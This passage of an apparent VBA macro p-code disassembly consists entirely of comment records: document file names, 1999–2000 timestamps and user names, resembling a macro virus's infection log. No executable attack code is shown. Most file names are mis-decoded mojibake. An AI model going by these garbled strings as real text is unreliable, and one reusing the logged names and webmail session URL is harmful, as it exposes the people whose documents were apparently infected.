' 	QuoteRem 0x0000 0x000C " jkr0927.doc"
' Line #710:
' Line #711:
' 	QuoteRem 0x0000 0x000C " 0928SXT.doc"
' Line #712:
' Line #713:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #714:
' Line #715:
' 	QuoteRem 0x0000 0x0016 " 灌黛놉乂 훨路돛陶.doc"
' Line #716:
' Line #717:
' 	QuoteRem 0x0000 0x0017 " 灌黛놉乂，훨路돛陶.doc"
' Line #718:
' Line #719:
' 	QuoteRem 0x0000 0x000F " 쏜皐뒈0927.doc"
' Line #720:
' Line #721:
' 	QuoteRem 0x0000 0x000D " �荇�0927.doc"
' Line #722:
' Line #723:
' 	QuoteRem 0x0000 0x0022 " 04:15:29 PM -Thursday,28 Oct,1999"
' Line #724:
' 	QuoteRem 0x0000 0x0004 " 008"
' Line #725:
' 	QuoteRem 0x0000 0x0000 ""
' Line #726:
' 	QuoteRem 0x0000 0x000D " life1027.doc"
' Line #727:
' Line #728:
' 	QuoteRem 0x0000 0x000A " c1029.doc"
' Line #729:
' Line #730:
' 	QuoteRem 0x0000 0x000A " c1101.doc"
' Line #731:
' Line #732:
' 	QuoteRem 0x0000 0x0022 " 09:27:51 AM -Wednesday,3 Nov,1999"
' Line #733:
' 	QuoteRem 0x0000 0x0004 " 008"
' Line #734:
' 	QuoteRem 0x0000 0x0000 ""
' Line #735:
' 	QuoteRem 0x0000 0x000A " c1103.doc"
' Line #736:
' Line #737:
' 	QuoteRem 0x0000 0x000D " 헝刻괩멩.doc"
' Line #738:
' Line #739:
' 	QuoteRem 0x0000 0x0009 " DSYS.doc"
' Line #740:
' Line #741:
' 	QuoteRem 0x0000 0x0009 " CAZHDBFW"
' Line #742:
' Line #743:
' 	QuoteRem 0x0000 0x000F " 珙덮콱봤：.doc"
' Line #744:
' Line #745:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #746:
' Line #747:
' 	QuoteRem 0x0000 0x000A " c1110.doc"
' Line #748:
' Line #749:
' 	QuoteRem 0x0000 0x0006 " 匡도2"
' Line #750:
' Line #751:
' 	QuoteRem 0x0000 0x001B " 《珂�鬼렘旼옹鴛㈕ぱ￡�.doc"
' Line #752:
' Line #753:
' 	QuoteRem 0x0000 0x0019 " 巧枷쾨쀼蔣（든斤경）.doc"
' Line #754:
' Line #755:
' 	QuoteRem 0x0000 0x001B " 句롤딧꿴맣경駕빈돨湳튬.doc"
' Line #756:
' Line #757:
' 	QuoteRem 0x0000 0x001F " 09:19:33 AM -Monday,8 Nov,1999"
' Line #758:
' 	QuoteRem 0x0000 0x0006 " yenan"
' Line #759:
' 	QuoteRem 0x0000 0x0000 ""
' Line #760:
' 	QuoteRem 0x0000 0x001B " 句롤딧꿴맣경駕빈돨湳튬.doc"
' Line #761:
' Line #762:
' 	QuoteRem 0x0000 0x000D " ~WRL1293.tmp"
' Line #763:
' Line #764:
' 	QuoteRem 0x0000 0x000B " 繫祇쩌.doc"
' Line #765:
' Line #766:
' 	QuoteRem 0x0000 0x000B " 션慤굶.doc"
' Line #767:
' Line #768:
' 	QuoteRem 0x0000 0x000B " 셕뺍蝎.doc"
' Line #769:
' Line #770:
' 	QuoteRem 0x0000 0x0027 " 譚黨딧꿴貢쭹賈痰셕炬샙쪽멕，헝몹貫.doc"
' Line #771:
' Line #772:
' 	QuoteRem 0x0000 0x000D " ~WRL0001.tmp"
' Line #773:
' Line #774:
' 	QuoteRem 0x0000 0x000D " ~WRL0001.tmp"
' Line #775:
' Line #776:
' 	QuoteRem 0x0000 0x0023 " 櫓벌든柬句롤딧꿴貢쭹묏鱗셕뺍蝎.doc"
' Line #777:
' Line #778:
' 	QuoteRem 0x0000 0x0023 " 櫓벌든柬句롤딧꿴貢쭹묏鱗셕뺍蝎.doc"
' Line #779:
' Line #780:
' 	QuoteRem 0x0000 0x000D " ~WRL0001.tmp"
' Line #781:
' Line #782:
' 	QuoteRem 0x0000 0x0017 " 뒈렘憩먁菫혹돨朞痙.doc"
' Line #783:
' Line #784:
' 	QuoteRem 0x0000 0x000D " 췽봄륩蛟.doc"
' Line #785:
' Line #786:
' 	QuoteRem 0x0000 0x0015 " 밑黨쐤퍅묏鱗鬼써.doc"
' Line #787:
' Line #788:
' 	QuoteRem 0x0000 0x0022 " 09:34:31 AM -Thursday,16 Nov,2000"
' Line #789:
' 	QuoteRem 0x0000 0x0006 " yenan"
' Line #790:
' 	QuoteRem 0x0000 0x0000 ""
' Line #791:
' 	QuoteRem 0x0000 0x0015 " 밑黨쐤퍅묏鱗鬼써.doc"
' Line #792:
' Line #793:
' 	QuoteRem 0x0000 0x0006 " 匡도2"
' Line #794:
' Line #795:
' 	QuoteRem 0x0000 0x0009 " �鉞�.doc"
' Line #796:
' Line #797:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #798:
' Line #799:
' 	QuoteRem 0x0000 0x0013 " 句롤딧꿴흔부隣.doc"
' Line #800:
' Line #801:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #802:
' Line #803:
' 	QuoteRem 0x0000 0x0006 " 匡도2"
' Line #804:
' Line #805:
' 	QuoteRem 0x0000 0x0013 " 句롤莉훙逃츰데.doc"
' Line #806:
' Line #807:
' 	QuoteRem 0x0000 0x0018 " 句롤莉훙逃츰데 25훙.doc"
' Line #808:
' Line #809:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #810:
' Line #811:
' 	QuoteRem 0x0000 0x0015 " 句롤莉훙逃돨�虛�.doc"
' Line #812:
' Line #813:
' 	QuoteRem 0x0000 0x0006 " 匡도2"
' Line #814:
' Line #815:
' 	QuoteRem 0x0000 0x0009 " Doc1.doc"
' Line #816:
' Line #817:
' 	QuoteRem 0x0000 0x0008 " tcm.doc"
' Line #818:
' Line #819:
' 	QuoteRem 0x0000 0x0006 " 匡도3"
' Line #820:
' Line #821:
' 	QuoteRem 0x0000 0x000D " 棍찡륩蛟.doc"
' Line #822:
' Line #823:
' 	QuoteRem 0x0000 0x000B " 柬괏팁.doc"
' Line #824:
' Line #825:
' 	QuoteRem 0x0000 0x0011 " 柬괏팁딧꿴깊.doc"
' Line #826:
' Line #827:
' 	QuoteRem 0x0000 0x000F " 貢쭹桔擎삔.doc"
' Line #828:
' Line #829:
' 	QuoteRem 0x0000 0x0023 " 01:16:25 PM -Wednesday,13 Dec,2000"
' Line #830:
' 	QuoteRem 0x0000 0x0006 " yenan"
' Line #831:
' 	QuoteRem 0x0000 0x0000 ""
' Line #832:
' 	QuoteRem 0x0000 0x000F " 貢쭹桔擎삔.doc"
' Line #833:
' Line #834:
' 	QuoteRem 0x0000 0x000B " 든柬憩.doc"
' Line #835:
' Line #836:
' 	QuoteRem 0x0000 0x002D " 櫓벌든柬句롤딧꿴貢냥逃憩젬溝훙섟젬溝렘駕.doc"
' Line #837:
' Line #838:
' 	QuoteRem 0x0000 0x0011 " 路헤돨툉堂쳬.doc"
' Line #839:
' Line #840:
' 	QuoteRem 0x0000 0x000B " 繫  列.doc"
' Line #841:
' Line #842:
' 	QuoteRem 0x0000 0x000B " 柬괏팁.doc"
' Line #843:
' Line #844:
' 	QuoteRem 0x0000 0x0015 " 밑黨뉴쌘景깎쌘커.doc"
' Line #845:
' Line #846:
' 	QuoteRem 0x0000 0x0009 " 踏狗.doc"
' Line #847:
' Line #848:
' 	QuoteRem 0x0000 0x0020 " 12:51:04 PM -Sunday,26 Dec,1999"
' Line #849:
' 	QuoteRem 0x0000 0x0004 " ljf"
' Line #850:
' 	QuoteRem 0x0000 0x0000 ""
' Line #851:
' 	QuoteRem 0x0000 0x0009 " 踏狗.doc"
' Line #852:
' Line #853:
' 	QuoteRem 0x0000 0x000F " 듐힛힛鬼틔.DOC"
' Line #854:
' Line #855:
' 	QuoteRem 0x0000 0x0006 " 匡도2"
' Line #856:
' Line #857:
' 	QuoteRem 0x0000 0x0075 " 쟀썅렷谿羚삶禿黨뎠덜匡欺桔씩썹綠쐤랗枷쾨，寧殮角맡쥴堵코뇹黨품懶뒈던、撻唐넣씹緞捲제돨路狼돨栗�疽噓읊捻錮㎑翔�寧.doc"
' Line #858:
' Line #859:
' 	QuoteRem 0x0000 0x000C " 뗍袈唐0.doc"
' Line #860:
' Line #861:
' 	QuoteRem 0x0000 0x000C " 뗍袈唐1.doc"
' Line #862:
' Line #863:
' 	QuoteRem 0x0000 0x000D " 뗍袈唐먁.doc"
' Line #864:
' Line #865:
' 	QuoteRem 0x0000 0x0006 " 匡도2"
' Line #866:
' Line #867:
' 	QuoteRem 0x0000 0x0009 " 북谿.doc"
' Line #868:
' Line #869:
' 	QuoteRem 0x0000 0x0009 " 2000.doc"
' Line #870:
' Line #871:
' 	QuoteRem 0x0000 0x000B " 봤�瀯�.doc"
' Line #872:
' Line #873:
' 	QuoteRem 0x0000 0x0019 " “냘懇珂덜”匡欺蝎溝.doc"
' Line #874:
' Line #875:
' 	QuoteRem 0x0000 0x0009 " Doc4.doc"
' Line #876:
' Line #877:
' 	QuoteRem 0x0000 0x0006 " 匡도2"
' Line #878:
' Line #879:
' 	QuoteRem 0x0000 0x0006 " 匡도2"
' Line #880:
' Line #881:
' 	QuoteRem 0x0000 0x0009 " 땡檄.doc"
' Line #882:
' Line #883:
' 	QuoteRem 0x0000 0x0009 " 斂냔.doc"
' Line #884:
' Line #885:
' 	QuoteRem 0x0000 0x0018 " 뗍《겟쾨凜鍍》唐먁0.doc"
' Line #886:
' Line #887:
' 	QuoteRem 0x0000 0x0017 " 뗍《겟쾨凜鍍》唐먁.doc"
' Line #888:
' Line #889:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #890:
' Line #891:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #892:
' Line #893:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #894:
' Line #895:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #896:
' Line #897:
' 	QuoteRem 0x0000 0x0011 " 쭈퓻죠�☏켜�.doc"
' Line #898:
' Line #899:
' 	QuoteRem 0x0000 0x0015 " 쭈퓻죠角寧몸봤훙.doc"
' Line #900:
' Line #901:
' 	QuoteRem 0x0000 0x0009 " 뉴莖.doc"
' Line #902:
' Line #903:
' 	QuoteRem 0x0000 0x0017 " 젯暾쟝角寧몸봤캡항.doc"
' Line #904:
' Line #905:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #906:
' Line #907:
' 	QuoteRem 0x0000 0x0021 " 찻꼍떼삔빽磎    틔瓘쏩給훙��.doc"
' Line #908:
' Line #909:
' 	QuoteRem 0x0000 0x0017 " 例콘遼酪잼콱唐뜩陶.doc"
' Line #910:
' Line #911:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #912:
' Line #913:
' 	QuoteRem 0x0000 0x0015 " �聆篇┙昞켯罔ば�.doc"
' Line #914:
' Line #915:
' 	QuoteRem 0x0000 0x0015 " �聆篇┙昞켯罔ば�.doc"
' Line #916:
' Line #917:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #918:
' Line #919:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #920:
' Line #921:
' 	QuoteRem 0x0000 0x000A " JG003.doc"
' Line #922:
' Line #923:
' 	QuoteRem 0x0000 0x000D " 쒔檀例쁜.doc"
' Line #924:
' Line #925:
' 	QuoteRem 0x0000 0x0009 " CMS1.doc"
' Line #926:
' Line #927:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #928:
' Line #929:
' 	QuoteRem 0x0000 0x000F " 굇쑴功괩멨.doc"
' Line #930:
' Line #931:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #932:
' Line #933:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #934:
' Line #935:
' 	QuoteRem 0x0000 0x0006 " 匡도2"
' Line #936:
' Line #937:
' 	QuoteRem 0x0000 0x000D " 눈廬목駕.doc"
' Line #938:
' Line #939:
' 	QuoteRem 0x0000 0x000D " 괩송목駕.doc"
' Line #940:
' Line #941:
' 	QuoteRem 0x0000 0x000D " 괩송목駕.doc"
' Line #942:
' Line #943:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #944:
' Line #945:
' 	QuoteRem 0x0000 0x001F " 貢쭹匡欺쉽寧賈疼賈慤놔唐凜.doc"
' Line #946:
' Line #947:
' 	QuoteRem 0x0000 0x000D " 쨀祺狂痙.doc"
' Line #948:
' Line #949:
' 	QuoteRem 0x0000 0x000F " 쑹틔嵐瓊갭.doc"
' Line #950:
' Line #951:
' 	QuoteRem 0x0000 0x0016 " 핵�ず衢� 珂�琴�朞.doc"
' Line #952:
' Line #953:
' 	QuoteRem 0x0000 0x0023 " 怒윰옹薑――求擄샙저袈돨蝎畇諒.doc"
' Line #954:
' Line #955:
' 	QuoteRem 0x0000 0x0010 " 315箇큇켈멨.doc"
' Line #956:
' Line #957:
' 	QuoteRem 0x0000 0x0016 " 315소든朞뭔멕癎멨.doc"
' Line #958:
' Line #959:
' 	QuoteRem 0x0000 0x000D " 숌괩목駕.doc"
' Line #960:
' Line #961:
' 	QuoteRem 0x0000 0x000D " 숌괩목駕.doc"
' Line #962:
' Line #963:
' 	QuoteRem 0x0000 0x000D " 랙멨悧써.doc"
' Line #964:
' Line #965:
' 	QuoteRem 0x0000 0x0009 " DOC1.DOC"
' Line #966:
' Line #967:
' 	QuoteRem 0x0000 0x0006 " 匡도2"
' Line #968:
' Line #969:
' 	QuoteRem 0x0000 0x0009 " DOC1.DOC"
' Line #970:
' Line #971:
' 	QuoteRem 0x0000 0x0009 " DOC1.DOC"
' Line #972:
' Line #973:
' 	QuoteRem 0x0000 0x000D " 캡老흔렀.doc"
' Line #974:
' Line #975:
' 	QuoteRem 0x0000 0x0013 " 굇쑴든柬憩뉴쌘.doc"
' Line #976:
' Line #977:
' 	QuoteRem 0x0000 0x0017 " 求擄“맴씐”劤매쿡.doc"
' Line #978:
' Line #979:
' 	QuoteRem 0x0000 0x0019 " 쑴멍膠撚淃커역連헙워.doc"
' Line #980:
' Line #981:
' 	QuoteRem 0x0000 0x000F " 劤壙멨룐충.doc"
' Line #982:
' Line #983:
' 	QuoteRem 0x0000 0x000F " 捺밟宅�넋�.doc"
' Line #984:
' Line #985:
' 	QuoteRem 0x0000 0x0015 " 宮獨貢弄푤荏헙훙.doc"
' Line #986:
' Line #987:
' 	QuoteRem 0x0000 0x000F " 捺밟宅�넋�.doc"
' Line #988:
' Line #989:
' 	QuoteRem 0x0000 0x0015 " 宮獨貢弄푤荏헙훙.doc"
' Line #990:
' Line #991:
' 	QuoteRem 0x0000 0x001F " 怒윰옹薑홍충쏵엊求擄샙契撚.doc"
' Line #992:
' Line #993:
' 	QuoteRem 0x0000 0x001F " 깥芎괵珞多랙齡잤셉朞痰裂轢.doc"
' Line #994:
' Line #995:
' 	QuoteRem 0x0000 0x0012 " 1墩익蛟롤츰데.doc"
' Line #996:
' Line #997:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #998:
' Line #999:
' 	QuoteRem 0x0000 0x001B " 씌轢뚤癎롸驕宅壇뚤꿉쫠.doc"
' Line #1000:
' Line #1001:
' 	QuoteRem 0x0000 0x0015 " “鬧雷제”쉽못强.doc"
' Line #1002:
' Line #1003:
' 	QuoteRem 0x0000 0x0009 " 캡항.doc"
' Line #1004:
' Line #1005:
' 	QuoteRem 0x0000 0x0017 " 깥芎、求擄샙잚1-26.doc"
' Line #1006:
' Line #1007:
' 	QuoteRem 0x0000 0x0013 " 묏鱗悧써悧룐충.doc"
' Line #1008:
' Line #1009:
' 	QuoteRem 0x0000 0x0015 " 좼�桭慈㉪滿湯쉼�.doc"
' Line #1010:
' Line #1011:
' 	QuoteRem 0x0000 0x0014 " 315풉瞳誇샙渡렝.doc"
' Line #1012:
' Line #1013:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #1014:
' Line #1015:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #1016:
' Line #1017:
' 	QuoteRem 0x0000 0x0012 " 3-4墩첵썽셕뺍.doc"
' Line #1018:
' Line #1019:
' 	QuoteRem 0x0000 0x001D " 《굶괩쏟휑놔샌》鱗諒츰데.doc"
' Line #1020:
' Line #1021:
' 	QuoteRem 0x0000 0x0006 " 匡도2"
' Line #1022:
' Line #1023:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #1024:
' Line #1025:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #1026:
' Line #1027:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #1028:
' Line #1029:
' 	QuoteRem 0x0000 0x0006 " 匡도2"
' Line #1030:
' Line #1031:
' 	QuoteRem 0x0000 0x001D " 《굶괩쏟휑놔샌》箇蝎츰데.doc"
' Line #1032:
' Line #1033:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #1034:
' Line #1035:
' 	QuoteRem 0x0000 0x0006 " 匡도2"
' Line #1036:
' Line #1037:
' 	QuoteRem 0x0000 0x000D " 묏鱗도갭.doc"
' Line #1038:
' Line #1039:
' 	QuoteRem 0x0000 0x000A " AXJLB.DOC"
' Line #1040:
' Line #1041:
' 	QuoteRem 0x0000 0x0007 " CH.DOC"
' Line #1042:
' Line #1043:
' 	QuoteRem 0x0000 0x0007 " DH.DOC"
' Line #1044:
' Line #1045:
' 	QuoteRem 0x0000 0x0009 " NAME.DOC"
' Line #1046:
' Line #1047:
' 	QuoteRem 0x0000 0x0007 " WJ.DOC"
' Line #1048:
' Line #1049:
' 	QuoteRem 0x0000 0x0009 " WZPB.DOC"
' Line #1050:
' Line #1051:
' 	QuoteRem 0x0000 0x0011 " 힛寧巧鬼喇쬠.doc"
' Line #1052:
' Line #1053:
' 	QuoteRem 0x0000 0x0017 " 굇쑴렛뒈끓憧羚痰멨.doc"
' Line #1054:
' Line #1055:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #1056:
' Line #1057:
' 	QuoteRem 0x0000 0x0012 " 鮫쳔綾劤壙멨2.doc"
' Line #1058:
' Line #1059:
' 	QuoteRem 0x0000 0x0012 " 鮫쳔綾劤壙멨1.doc"
' Line #1060:
' Line #1061:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #1062:
' Line #1063:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #1064:
' Line #1065:
' 	QuoteRem 0x0000 0x0013 " 츠츠겜겜朞소든.doc"
' Line #1066:
' Line #1067:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #1068:
' Line #1069:
' 	QuoteRem 0x0000 0x0015 " 劤壙젬꺄꽃련쀼댑.doc"
' Line #1070:
' Line #1071:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #1072:
' Line #1073:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #1074:
' Line #1075:
' 	QuoteRem 0x0000 0x0012 " 鮫쳔綾劤壙멨3.doc"
' Line #1076:
' Line #1077:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #1078:
' Line #1079:
' 	QuoteRem 0x0000 0x000D " 잠궐沂븐.doc"
' Line #1080:
' Line #1081:
' 	QuoteRem 0x0000 0x001D " 든緞침렘“걔薑엥”瞳旗瘻.doc"
' Line #1082:
' Line #1083:
' 	QuoteRem 0x0000 0x0017 " 깥芎、求擄샙잚2-16.doc"
' Line #1084:
' Line #1085:
' 	QuoteRem 0x0000 0x0011 " 鮫쳔綾瞳櫓벌.doc"
' Line #1086:
' Line #1087:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #1088:
' Line #1089:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #1090:
' Line #1091:
' 	QuoteRem 0x0000 0x0018 " SBSpublicconsulting.doc"
' Line #1092:
' Line #1093:
' 	QuoteRem 0x0000 0x0015 " 쑹틔嵐흡劤壙셕뺍.doc"
' Line #1094:
' Line #1095:
' 	QuoteRem 0x0000 0x000C " 劤壙멨4.doc"
' Line #1096:
' Line #1097:
' 	QuoteRem 0x0000 0x0006 " 匡도2"
' Line #1098:
' Line #1099:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #1100:
' Line #1101:
' 	QuoteRem 0x0000 0x000D " 吝路행뉴.doc"
' Line #1102:
' Line #1103:
' 	QuoteRem 0x0000 0x0017 " 깥芎、求擄샙잚2-16.doc"
' Line #1104:
' Line #1105:
' 	QuoteRem 0x0000 0x0017 " 깥芎、求擄샙잚2-16.doc"
' Line #1106:
' Line #1107:
' 	QuoteRem 0x0000 0x0013 " 깥芎冷狼隣竟쇱.doc"
' Line #1108:
' Line #1109:
' 	QuoteRem 0x0000 0x0011 " 憐竟뚤癎栗죕.doc"
' Line #1110:
' Line #1111:
' 	QuoteRem 0x0000 0x0017 " 깥芎、求擄샙잚2-16.doc"
' Line #1112:
' Line #1113:
' 	QuoteRem 0x0000 0x000D " 뚤癎栗죕.doc"
' Line #1114:
' Line #1115:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #1116:
' Line #1117:
' 	QuoteRem 0x0000 0x0013 " 浬놔机緊돨큽��.doc"
' Line #1118:
' Line #1119:
' 	QuoteRem 0x0000 0x0009 " 괩멩.doc"
' Line #1120:
' Line #1121:
' 	QuoteRem 0x0000 0x0013 " 뎠큽훙枓島貢쭹.doc"
' Line #1122:
' Line #1123:
' 	QuoteRem 0x0000 0x0006 " 匡도2"
' Line #1124:
' Line #1125:
' 	QuoteRem 0x0000 0x0009 " 눈廬.doc"
' Line #1126:
' Line #1127:
' 	QuoteRem 0x0000 0x0011 " 鬼�酎懇쫍타�.doc"
' Line #1128:
' Line #1129:
' 	QuoteRem 0x0000 0x000F " Sinch-c(1).doc"
' Line #1130:
' Line #1131:
' 	QuoteRem 0x0000 0x0013 " 뎠큽훙枓島貢쭹.doc"
' Line #1132:
' Line #1133:
' 	QuoteRem 0x0000 0x0013 " 쀼련써벎劤壙멨.doc"
' Line #1134:
' Line #1135:
' 	QuoteRem 0x0000 0x0012 " 鮫쳔綾劤壙멨4.doc"
' Line #1136:
' Line #1137:
' 	QuoteRem 0x0000 0x0012 " 鮫쳔綾劤壙멨5.doc"
' Line #1138:
' Line #1139:
' 	QuoteRem 0x0000 0x000E " 630양끝멨.doc"
' Line #1140:
' Line #1141:
' 	QuoteRem 0x0000 0x0019 " 櫓벌든柬撚突쿨劤샙島.doc"
' Line #1142:
' Line #1143:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #1144:
' Line #1145:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #1146:
' Line #1147:
' 	QuoteRem 0x0000 0x0006 " 匡도2"
' Line #1148:
' Line #1149:
' 	QuoteRem 0x0000 0x0006 " 匡도3"
' Line #1150:
' Line #1151:
' 	QuoteRem 0x0000 0x0006 " 匡도4"
' Line #1152:
' Line #1153:
' 	QuoteRem 0x0000 0x0006 " 匡도5"
' Line #1154:
' Line #1155:
' 	QuoteRem 0x0000 0x0021 " 鷺랍릿角꼇角“各셩櫓벌앵隔”.doc"
' Line #1156:
' Line #1157:
' 	QuoteRem 0x0000 0x000D " 룐충�碗�.doc"
' Line #1158:
' Line #1159:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #1160:
' Line #1161:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #1162:
' Line #1163:
' 	QuoteRem 0x0000 0x0009 " Doc1.doc"
' Line #1164:
' Line #1165:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #1166:
' Line #1167:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #1168:
' Line #1169:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #1170:
' Line #1171:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #1172:
' Line #1173:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #1174:
' Line #1175:
' 	QuoteRem 0x0000 0x0019 " 捏틔탬댔폅“묑懃濫”.doc"
' Line #1176:
' Line #1177:
' 	QuoteRem 0x0000 0x0012 " 鮫쳔綾劤壙멨6.doc"
' Line #1178:
' Line #1179:
' 	QuoteRem 0x0000 0x000D " 든켬栗죕.doc"
' Line #1180:
' Line #1181:
' 	QuoteRem 0x0000 0x0011 " 일奈났劤壙멨.doc"
' Line #1182:
' Line #1183:
' 	QuoteRem 0x0000 0x0013 " 怒윰옹薑瞳櫓벌.doc"
' Line #1184:
' Line #1185:
' 	QuoteRem 0x0000 0x0018 " road show--2000匡俚.doc"
' Line #1186:
' Line #1187:
' 	QuoteRem 0x0000 0x000B " 썩綱늦.doc"
' Line #1188:
' Line #1189:
' 	QuoteRem 0x0000 0x0011 " 怒윰옹薑저袈.doc"
' Line #1190:
' Line #1191:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #1192:
' Line #1193:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #1194:
' Line #1195:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #1196:
' Line #1197:
' 	QuoteRem 0x0000 0x0012 " 鮫쳔綾劤壙멨7.doc"
' Line #1198:
' Line #1199:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #1200:
' Line #1201:
' 	QuoteRem 0x0000 0x000F " newspaper2.doc"
' Line #1202:
' Line #1203:
' 	QuoteRem 0x0000 0x0012 " 鮫쳔綾劤壙멨8.doc"
' Line #1204:
' Line #1205:
' 	QuoteRem 0x0000 0x0013 " 묏鱗도갭（랗）.doc"
' Line #1206:
' Line #1207:
' 	QuoteRem 0x0000 0x0013 " robot brochure.doc"
' Line #1208:
' Line #1209:
' 	QuoteRem 0x0000 0x000B " 탠찡可.doc"
' Line #1210:
' Line #1211:
' 	QuoteRem 0x0000 0x0015 " 暠튬뚤궐匡俚綱츠.doc"
' Line #1212:
' Line #1213:
' 	QuoteRem 0x0000 0x0013 " 저쎌걔薑엥츰데.doc"
' Line #1214:
' Line #1215:
' 	QuoteRem 0x0000 0x000B " 썩綱늦.doc"
' Line #1216:
' Line #1217:
' 	QuoteRem 0x0000 0x000B " 男헝변.doc"
' Line #1218:
' Line #1219:
' 	QuoteRem 0x0000 0x000B " 男헝변.doc"
' Line #1220:
' Line #1221:
' 	QuoteRem 0x0000 0x0010 " 릿숭 썩綱늦.doc"
' Line #1222:
' Line #1223:
' 	QuoteRem 0x0000 0x0011 " 쑹틔嵐劤壙멨.doc"
' Line #1224:
' Line #1225:
' 	QuoteRem 0x0000 0x0013 " 쑹틔嵐劤壙멨랗.doc"
' Line #1226:
' Line #1227:
' 	QuoteRem 0x0000 0x000D " 啖攣뽈뒨.doc"
' Line #1228:
' Line #1229:
' 	QuoteRem 0x0000 0x0021 " 09:41:53 AM -Tuesday,30 Mar,1999"
' Line #1230:
' 	QuoteRem 0x0000 0x0003 " sl"
' Line #1231:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1232:
' 	QuoteRem 0x0000 0x0080 " %D3%BA%D5%FD%BB%CA%B5%DB.doc?funcid=readpart&websid=EAGiYwAhG&mid=MX6aBTm174i47-D5EEYS&part=2&filename=%D3%BA%D5%FD%BB%CA%B5%DB"
' Line #1233:
' Line #1234:
' 	QuoteRem 0x0000 0x0023 " 匡도瞳 Microsoft Internet Explorer"
' Line #1235:
' Line #1236:
' 	QuoteRem 0x0000 0x0023 " 匡도瞳 Microsoft Internet Explorer"
' Line #1237:
' Line #1238:
' 	QuoteRem 0x0000 0x0006 " 2.doc"
' Line #1239:
' Line #1240:
' 	QuoteRem 0x0000 0x0020 " 10:28:29 AM -Monday,10 Apr,2000"
' Line #1241:
' 	QuoteRem 0x0000 0x0005 " 謳렵"
' Line #1242:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1243:
' 	QuoteRem 0x0000 0x0015 " 쀼瓘《啖攣뽈뒨》.doc"
' Line #1244:
' Line #1245:
' 	QuoteRem 0x0000 0x0013 " 乖쳬呵쭝죄痂척.doc"
' Line #1246:
' Line #1247:
' 	QuoteRem 0x0000 0x000D " LJSEXXYI.doc"
' Line #1248:
' Line #1249:
' 	QuoteRem 0x0000 0x000D " LJSEXXYI.doc"
' Line #1250:
' Line #1251:
' 	QuoteRem 0x0000 0x0027 " 밑黨무鱇撚蛟훙逃饋簡섟쉽쟨桿契곗랬.doc"
' Line #1252:
' Line #1253:
' 	QuoteRem 0x0000 0x001B " 鷺믄냘邱�骸켯近吐캥�밖.doc"
' Line #1254:
' Line #1255:
' 	QuoteRem 0x0000 0x000F " 댕牘돨믐慤.doc"
' Line #1256:
' Line #1257:
' 	QuoteRem 0x0000 0x0006 " 1.doc"
' Line #1258:
' Line #1259:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #1260:
' Line #1261:
' 	QuoteRem 0x0000 0x0006 " 1.doc"
' Line #1262:
' Line #1263:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #1264:
' Line #1265:
' 	QuoteRem 0x0000 0x0007 " x1.doc"
' Line #1266:
' Line #1267:
' 	QuoteRem 0x0000 0x001F " 큔獨“櫓벌匡뺏�慊납퐈굣쉼�.doc"
' Line #1268:
' Line #1269:
' 	QuoteRem 0x0000 0x0022 " 09:36:48 PM -Thursday,13 Apr,2000"
' Line #1270:
' 	QuoteRem 0x0000 0x0007 " 觀쟝엊"
' Line #1271:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1272:
' 	QuoteRem 0x0000 0x001F " 큔獨“櫓벌匡뺏�慊납퐈굣쉼�.doc"
' Line #1273:
' Line #1274:
' 	QuoteRem 0x0000 0x000D " 무鱇淃커.doc"
' Line #1275:
' Line #1276:
' 	QuoteRem 0x0000 0x0020 " 11:29:30 AM -Friday,14 Apr,2000"
' Line #1277:
' 	QuoteRem 0x0000 0x0005 " 蠟에"
